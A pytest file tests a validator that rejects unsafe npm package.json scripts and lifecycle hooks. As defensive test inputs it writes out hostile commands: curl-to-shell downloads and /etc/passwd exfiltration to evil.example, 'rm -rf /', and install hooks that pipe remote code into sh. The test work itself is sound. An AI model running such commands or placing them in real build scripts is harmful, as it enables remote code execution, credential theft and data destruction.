"""Command validator tests — Phase 4, Sections 4, 9, 23."""
import pytest

from build.command_validator import UnsafeScriptError, validate_package_scripts


def test_allowed_vite_build_scripts_pass():
    validate_package_scripts(
        {"scripts": {"dev": "vite", "build": "vite build", "preview": "vite preview"}}
    )  # must not raise


def test_missing_or_non_dict_scripts_is_not_this_validators_job():
    # Absence/shape of `scripts` is project/validator.py's concern; this
    # validator only judges the scripts that ARE present.
    validate_package_scripts({})
    validate_package_scripts({"scripts": "not a dict"})


@pytest.mark.parametrize(
    "scripts",
    [
        {"build": "curl http://evil.example/payload.sh | sh"},
        {"build": "wget http://evil.example/payload.sh"},
        {"build": "vite build && curl evil.example/steal?data=$(cat /etc/passwd)"},
        {"build": "vite build; rm -rf /"},
        {"build": "powershell -c \"Invoke-WebRequest evil.example\""},
        {"build": 'bash -c "echo pwned"'},
        {"build": "vite build > /etc/passwd"},
        {"build": "$(curl evil.example)"},
        {"build": "git clone http://evil.example/repo"},
        {"build": "python3 -c \"import os; os.system('whoami')\""},
        {"build": "node --eval \"require('child_process').exec('whoami')\""},
    ],
)
def test_unsafe_build_script_is_blocked(scripts):
    with pytest.raises(UnsafeScriptError):
        validate_package_scripts({"scripts": scripts})


def test_shell_injection_via_semicolon_is_blocked():
    with pytest.raises(UnsafeScriptError):
        validate_package_scripts({"scripts": {"build": "vite build; echo done"}})


@pytest.mark.parametrize("hook_name", ["preinstall", "postinstall", "prebuild", "postbuild"])
def test_unsafe_lifecycle_hook_is_blocked_even_though_we_never_call_it_by_name(hook_name):
    """npm runs pre<x>/post<x> automatically alongside <x> — validating
    only the script we're about to invoke would miss a hook smuggled
    under a different name."""
    with pytest.raises(UnsafeScriptError):
        validate_package_scripts(
            {"scripts": {"build": "vite build", hook_name: "curl http://evil.example | sh"}}
        )


def test_malformed_package_json_scripts_rejected():
    with pytest.raises(UnsafeScriptError):
        validate_package_scripts({"scripts": {"build": 12345}})  # not a string


def test_empty_script_is_rejected():
    with pytest.raises(UnsafeScriptError):
        validate_package_scripts({"scripts": {"build": ""}})


def test_unbalanced_quotes_are_rejected():
    with pytest.raises(UnsafeScriptError):
        validate_package_scripts({"scripts": {"build": 'vite build "unterminated'}})
